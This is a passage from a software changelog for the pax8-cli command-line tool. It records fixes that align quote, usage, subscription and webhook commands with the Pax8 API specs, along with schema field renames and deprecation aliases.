  Scope: `quotes create` only. The remaining body-shape issues on `quotes update` ([#313](https://github.com/pax8labs/pax8-cli/issues/313)), `quotes send` ([#314](https://github.com/pax8labs/pax8-cli/issues/314)), and `quotes line-items add` ([#312](https://github.com/pax8labs/pax8-cli/issues/312)) are tracked separately under the `quotes-v2-body-shape` label.

- [#342](https://github.com/pax8labs/pax8-cli/pull/342) [`db00533`](https://github.com/pax8labs/pax8-cli/commit/db005336a163b6028d7d75a5628d6a9f0d824278) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes line-items add` now sends the `effectiveDate` and `price` fields that the v2 `POST /v2/quotes/{quoteId}/line-items` Standard payload requires. Before this fix the call had the right URL (post-[#316](https://github.com/pax8labs/pax8-cli/issues/316)) but a 4xx-eliciting body — the v2 `AddStandardLineItemPayload` schema marks both fields required, and the CLI sent neither.

  `effectiveDate` defaults to today (UTC), normalized to ISO 8601 (`YYYY-MM-DDT00:00:00Z`); `price` defaults to the product's list price (`suggestedRetailPrice`) for the chosen billing term, resolved via `products getPricing` and cached per command run. Both are overridable via new flags: `--effective-date <YYYY-MM-DD>` (strict format) and `--price <number>` (non-negative). The Standard payload is the only shape exposed — Custom and UsageBased remain out of scope (separate scope decision per [#310](https://github.com/pax8labs/pax8-cli/issues/310)).

  Schema change: `AddQuoteLineItemInputSchema` in `@pax8/core` now requires `effectiveDate: z.string()` and `price: z.number()`. Downstream callers constructing `AddQuoteLineItemInput` directly must supply both.

  Closes [#312](https://github.com/pax8labs/pax8-cli/issues/312).

- [#354](https://github.com/pax8labs/pax8-cli/pull/354) [`18e2e1f`](https://github.com/pax8labs/pax8-cli/commit/18e2e1f3e64e110be3d470e736c60941555aa1a8) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes update` and `pax8 quotes send` now send the v2-spec body shape on `PUT /v2/quotes/{id}`. Per the public quoting OpenAPI spec (v2.0.0), every PUT on that endpoint requires all five mutable fields (`expiresOn`, `introMessage`, `published`, `status`, `termsAndDisclaimers`) — there is no partial PUT and no separate status-transition endpoint. The previous bodies (`{ lineItems?, expiresOn? }` for `update`; `{ status }` for `send`/`setStatus`) would have produced 4xx body-shape errors against the real API ([#313](https://github.com/pax8labs/pax8-cli/issues/313), [#314](https://github.com/pax8labs/pax8-cli/issues/314); see `docs/triage/quotes-api-version.md` §9.1).

  Behavior changes:
  - `QuotesApi.update(id, overrides)` now does fetch-then-merge internally: it GETs the current quote, projects (current + overrides) through a shared `buildFullUpdatePayload` helper, then PUTs the full 5-field body. Callers see a partial-override interface (`{ expiresOn?, introMessage?, published?, status?, termsAndDisclaimers? }`) and don't need to think about the server-side contract.
  - `QuotesApi.setStatus(id, status)` and `QuotesApi.send(id)` ride the same fetch-then-merge path — status transitions go through `update({ status })`, not a status-only PUT body.
  - `UpdateQuoteInputSchema` is rewritten: `lineItems` is removed entirely (the v2 PUT does not accept it); `expiresOn`, `introMessage`, `published`, `status`, and `termsAndDisclaimers` are added as optional overrides.
  - `QuoteSchema` adds `introMessage` and `termsAndDisclaimers` as required strings — both must round-trip through the read shape so fetch-then-merge can preserve them on writes.
  - `pax8 quotes update --expiration-date YYYY-MM-DD` now normalizes the user-friendly date to ISO 8601 midnight-UTC (`YYYY-MM-DDT00:00:00Z`) before sending, matching the v2 spec's `date-time` typing. A new shared `normalizeIsoDate(raw, flagName)` helper is factored out from the existing `resolveEffectiveDate` so both `--expiration-date` and `--effective-date` get the same parse-and-validate behavior with flag-specific error messages.
  - `pax8 quotes update --product` no longer relies on the top-level PUT to replace line items (the v2 surface doesn't accept it). The CLI decomposes the request into per-line `DELETE /v2/quotes/{id}/line-items/{lineItemId}` calls for existing items plus a fresh `POST /v2/quotes/{id}/line-items` for the new one — reusing the `resolveListPrice` / `resolveEffectiveDate` helpers that `quotes create` and `quotes line-items add` already share. Partial-failure between the delete and the add is surfaced with a clear `pax8 quotes line-items add ...` recovery hint, mirroring the pattern from `quotes create` ([#311](https://github.com/pax8labs/pax8-cli/issues/311)).

  Out of scope: `--intro-message` / `--terms-and-disclaimers` / `--status` are not exposed as CLI flags — those fields aren't user-settable today, and the fetch-then-merge preserves the server-side values transparently. Exposing them is a separate enhancement.

  Closes [#313](https://github.com/pax8labs/pax8-cli/issues/313) and [#314](https://github.com/pax8labs/pax8-cli/issues/314). The remaining body-shape audit row (`POST /v2/quotes/{id}/line-items` add, [#312](https://github.com/pax8labs/pax8-cli/issues/312)) was resolved earlier; with this patch the entire `quotes-v2-body-shape` label is empty.

- [#316](https://github.com/pax8labs/pax8-cli/pull/316) [`3b9026b`](https://github.com/pax8labs/pax8-cli/commit/3b9026ba3b56cf6b2f331b4aa5982d6631dfd6b0) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes` and `pax8 quotes line-items` commands now hit the correct v2 wire path. Previously every quote request resolved to `https://api.pax8.com/v1/quotes/...`, which the public Pax8 API does not document — quotes live only at `/v2/quotes/...` per the quoting OpenAPI spec (v2.0.0). The CLI's quote commands returned 404 against the real API.

  Wire path only: this hotfix routes the requests to the right URL. Five read operations (`quotes list/show/delete`, `quotes line-items list/remove`) now work end-to-end against the real v2 API. Five write operations (`quotes create/update/send`, `quotes line-items add`) still fail until follow-up body-shape fixes land — but they now fail visibly with 4xx body-shape errors instead of silent 404s. The body-shape work is tracked under the `quotes-v2-body-shape` label and held until integration test coverage exists ([#308](https://github.com/pax8labs/pax8-cli/issues/308)). See `docs/triage/quotes-api-version.md` for the full audit, including the retrospective on why the initial wire-path audit didn't catch the body-shape problems.

  `Pax8Client` gains a `RequestOpts` per-call parameter on `get`/`post`/`put`/`patch`/`delete`/`getPaginated`, currently used only to opt into a non-default API version (`{ apiVersion: "v2" }`). Other API classes are unchanged and continue to inherit the default `/v1` from the shared base URL.

- [#338](https://github.com/pax8labs/pax8-cli/pull/338) [`aa0840e`](https://github.com/pax8labs/pax8-cli/commit/aa0840eedbe18304847cbc1ad95653765d8d785b) Thanks [@jidulberger](https://github.com/jidulberger)! - Docs: README Quick Start now leads with a working run-from-source path (`git clone` + `pnpm install` + `pnpm build` + `node packages/cli/dist/index.js`) and clearly marks `npm install -g @pax8/cli` as the post-v0.1.0 install path. Previously the documented Quick Start started with `npm install -g @pax8/cli`, which 404s because `@pax8/cli` is not yet published — every first-time visitor hit a dead-end on the first command. The README Status section now carries a pre-release callout linking to the source-install steps. Closes [#257](https://github.com/pax8labs/pax8-cli/issues/257).

- [#361](https://github.com/pax8labs/pax8-cli/pull/361) [`2338145`](https://github.com/pax8labs/pax8-cli/commit/23381453719fa95551414e11dccfc375db0365a8) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 recommendations list` no longer leaks raw product IDs into human (table) output and no longer renders the same recommendation list twice. The "Quick actions" block — a per-rec `orders create --company "<name>" --product <uuid> --quantity <n>` snippet that re-printed every visible recommendation and exposed the product UUID in non-JSON output — has been replaced with a single one-line summary (`Top N alone capture $X/mo.`). The table above is the menu, and the existing one-line `promptNextSteps` drill-in hint stays unchanged. JSON output is untouched: every `recommendation.orderCommand` still includes the full `--product <id>` form so agents and downstream tooling can execute it verbatim. Closes [#195](https://github.com/pax8labs/pax8-cli/issues/195).

  Also adds a `PAX8_OUTPUT_FORMAT` env-var escape hatch (`table` | `json` | `csv` | `quiet`) in `getOutputFormat` so subprocess tests can exercise the human-render code path — without it the non-TTY auto-fallback to JSON makes table-mode regressions like this one impossible to assert from a piped child process.

- [#285](https://github.com/pax8labs/pax8-cli/pull/285) [`f659118`](https://github.com/pax8labs/pax8-cli/commit/f65911826839521c4d74f96b50e07521faa29f9c) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 status` renamed to `pax8 dashboard` for clarity. The previous name collided semantically with `pax8 auth status` (an auth-credential check) and was generically named for what is actually a portfolio dashboard (top customers by MRR, urgent renewals, top recommendations). `pax8 status` is preserved as a deprecated alias that still functions identically but prints a one-line deprecation notice on stderr (`warning: \`status\` is deprecated; use \`dashboard\`. Will be removed in v1.0.`); it is hidden from `pax8 --help`so the canonical name is the only one advertised. No-change for scripts already calling`pax8 status`; new scripts and docs should prefer `pax8 dashboard`. Mirrors the parallel `--events`→`--topics`deprecation shipped on`pax8 webhooks create`.

- [#347](https://github.com/pax8labs/pax8-cli/pull/347) [`cc7b004`](https://github.com/pax8labs/pax8-cli/commit/cc7b0046e6d87173d554c54b9e2f32e0c1b4ac5e) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 subscriptions cancel --cancel-date` now sends the `cancelDate` query parameter as RFC 3339 / ISO 8601 `date-time` (`YYYY-MM-DDT00:00:00Z`) to match the Pax8 OpenAPI spec, which types the parameter as `format: date-time`. Previously the CLI sent the date-only form `YYYY-MM-DD` — most APIs accept that leniently, but the contract mismatch was unverified and would have surprised partners reading the spec.

  User-facing behavior is unchanged: the `--cancel-date` flag still accepts (and only accepts) the simple `YYYY-MM-DD` form, and `--json` output still emits `cancelDate` as `YYYY-MM-DD`. The normalization happens inside `SubscriptionsApi.delete()` just before the wire call, mirroring the defensive `effectiveDate` normalization landed for `quotes line-items add` in [#312](https://github.com/pax8labs/pax8-cli/issues/312). Closes [#333](https://github.com/pax8labs/pax8-cli/issues/333).

- [#343](https://github.com/pax8labs/pax8-cli/pull/343) [`aaa56e1`](https://github.com/pax8labs/pax8-cli/commit/aaa56e12355abf8d247346b5d1f4e70ab1af3192) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 usage list` and `pax8 usage show --lines` now hit the wire paths the Pax8 public spec actually documents. Previously `UsageApi.listSummaries` called a flat `GET /v1/usage-summaries` endpoint that does not exist (the spec only exposes the nested `GET /v1/subscriptions/{subscriptionId}/usage-summaries`), and `UsageApi.listLines` called `/v1/usage-summaries/{id}/lines` instead of the documented `/v1/usage-summaries/{id}/usage-lines`. Both bugs surfaced as 404s against the real Pax8 API.

  `UsageApi.listSummaries(subscriptionId, params)` now requires a subscription ID. At the CLI surface the change is backward-compatible: `pax8 usage list --company <id|name>` continues to work and now resolves to the company's subscriptions, then iterates over each subscription's nested usage-summaries endpoint. A new `--subscription <id>` flag is available as the direct path for callers that already have a subscription ID. The `UsageSummary` schema gains an optional `subscriptionId` field, populated in demo data so the agent-facing output exposes the link from summary back to subscription.

  Closes [#337](https://github.com/pax8labs/pax8-cli/issues/337). Closes [#212](https://github.com/pax8labs/pax8-cli/issues/212) transitively.

- [#349](https://github.com/pax8labs/pax8-cli/pull/349) [`e179b35`](https://github.com/pax8labs/pax8-cli/commit/e179b35b9ea4fe0bfd5cad4339ca183e5666c6c2) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 webhooks create`: align the request body with the public Pax8 webhooks v2 OpenAPI contract. The CLI now sends `{ url, displayName, webhookTopics: [{ topic, filters }] }` instead of the pre-[#323](https://github.com/pax8labs/pax8-cli/issues/323) `{ url, topics: string[] }`. A spec-strict server would 422 on the old shape (missing required `displayName`; wrong key name and element shape for the topic list).
  - Adds a required `--display-name <name>` flag to `pax8 webhooks create`. Help text explains why: the Pax8 API requires it.
  - Keeps the user-facing `--topics T1,T2` flag unchanged so partner scripts continue to work; the CLI transforms it into the structured `webhookTopics: [{ topic, filters: [] }]` shape at the wire layer.
  - `--events` continues to work as a deprecated alias for `--topics`.

  Per-topic `filters` are accepted by the spec but not yet exposed on the CLI surface — each topic ships with an empty filter array, which the server treats as "deliver every event for this topic". A structured filter-authoring UX is tracked separately.

- Updated dependencies [[`a6cea7f`](https://github.com/pax8labs/pax8-cli/commit/a6cea7fea15bbe63efa9aaf2223737057c44f6d9), [`758eb98`](https://github.com/pax8labs/pax8-cli/commit/758eb98ed058e53a8961defb7492ecf710ebb6f2), [`5faf8a3`](https://github.com/pax8labs/pax8-cli/commit/5faf8a3b91688651afd1a12097c89e28ce65a20a), [`8108ea0`](https://github.com/pax8labs/pax8-cli/commit/8108ea096d2ea82d24fc4cbb8f374952976fe9be), [`87dd835`](https://github.com/pax8labs/pax8-cli/commit/87dd8350cf2ec89232bd527d6284421cc05dcaf1), [`d3d8316`](https://github.com/pax8labs/pax8-cli/commit/d3d8316998343e11d3c0057bb44add7cbeff55e7), [`828444e`](https://github.com/pax8labs/pax8-cli/commit/828444e5669e1f05a674fafec8ea72428ff3f9a1), [`629011f`](https://github.com/pax8labs/pax8-cli/commit/629011f861cf8c052e9eaea00bc360e0b58b42e1), [`1dcf2d9`](https://github.com/pax8labs/pax8-cli/commit/1dcf2d9beb25cb78bd39b2be184111aa189225a3), [`e307132`](https://github.com/pax8labs/pax8-cli/commit/e3071321aaf0dd6a4a36bbe76882b8ccd47f28f4), [`41c13e6`](https://github.com/pax8labs/pax8-cli/commit/41c13e6677b5781236c2ba21bde56d4464d40057), [`db00533`](https://github.com/pax8labs/pax8-cli/commit/db005336a163b6028d7d75a5628d6a9f0d824278), [`18e2e1f`](https://github.com/pax8labs/pax8-cli/commit/18e2e1f3e64e110be3d470e736c60941555aa1a8), [`3b9026b`](https://github.com/pax8labs/pax8-cli/commit/3b9026ba3b56cf6b2f331b4aa5982d6631dfd6b0), [`cc7b004`](https://github.com/pax8labs/pax8-cli/commit/cc7b0046e6d87173d554c54b9e2f32e0c1b4ac5e), [`aaa56e1`](https://github.com/pax8labs/pax8-cli/commit/aaa56e12355abf8d247346b5d1f4e70ab1af3192), [`e507f77`](https://github.com/pax8labs/pax8-cli/commit/e507f7702b1b9e281534ef396d91fc61cca87ede), [`e179b35`](https://github.com/pax8labs/pax8-cli/commit/e179b35b9ea4fe0bfd5cad4339ca183e5666c6c2)]:
  - @pax8/core@0.3.0

### Minor Changes

- [#277](https://github.com/pax8labs/pax8-cli/pull/277) [`0b579bd`](https://github.com/pax8labs/pax8-cli/commit/0b579bd35c58db62bf038c9641b474eec3d9ce87) Thanks [@jidulberger](https://github.com/jidulberger)! - **Schema additions and a small dropped field.**
  - `Product.vendor` (duplicate of `vendorName`) removed — only `vendorName` remains, matching the public API. Demo data and consumers updated.
  - `Company.externalId` surfaced — partner-side identifier returned by the API. Available in `pax8 companies show` (table + `--json`).
  - `Subscription.currencyCode` surfaced — ISO-4217 currency code returned by the API. Available in `pax8 subscriptions list/show` `--json` output; appended to the price column in table view only when the value is non-`USD`.
  - Inline documentation block added on `SubscriptionSchema` clarifying the intentional ergonomic split between the canonical nested `commitment` (alias for the API's `commitmentTerm`) and the flattened top-level `commitmentTermEndDate`. No behavior change.

  Closes [#273](https://github.com/pax8labs/pax8-cli/issues/273).

- [#275](https://github.com/pax8labs/pax8-cli/pull/275) [`6f282fb`](https://github.com/pax8labs/pax8-cli/commit/6f282fb109fe91dffb1a7eeafa3a104d36b12e58) Thanks [@jidulberger](https://github.com/jidulberger)! - **Breaking (`--json` consumers): Field naming aligned with the public Pax8 API.**
  - `InvoiceItem.subtotal` → `subTotal`
  - `InvoiceItem.unitPrice` → `price`
  - `Company.modified` → `updatedDate`
  - `Quote.expirationDate` → `expiresOn`
  - `Quote.createdDate` → `createdOn`

  Acceptable while pre-1.0; the CLI now uses API field names directly so partners reading both surfaces don't have to translate. The `--expiration-date` CLI flag on `pax8 quotes create` and `pax8 quotes update` is unchanged — flag vocabulary and field vocabulary are intentionally separate concerns. (refs [#273](https://github.com/pax8labs/pax8-cli/issues/273))

### Patch Changes

- [#274](https://github.com/pax8labs/pax8-cli/pull/274) [`b717681`](https://github.com/pax8labs/pax8-cli/commit/b71768166ca4e2dbaeefd5c9890ab60d779d9536) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 webhooks create`: renamed `--events` to `--topics` for consistency with the API field name (`webhookTopics`) and the CLI's own `Webhook.topics[]` output schema. `--events` is preserved as a deprecated alias that still functions identically but prints a one-line deprecation notice on stderr; it will be removed in v1.0. Passing both `--topics` and `--events` simultaneously is rejected with `ERROR_INVALID_INPUT`. No-change for scripts already calling `--events`; new scripts and docs should prefer `--topics`. Refs [#273](https://github.com/pax8labs/pax8-cli/issues/273).

- Updated dependencies [[`0b579bd`](https://github.com/pax8labs/pax8-cli/commit/0b579bd35c58db62bf038c9641b474eec3d9ce87), [`6f282fb`](https://github.com/pax8labs/pax8-cli/commit/6f282fb109fe91dffb1a7eeafa3a104d36b12e58)]:
  - @pax8/core@0.2.0
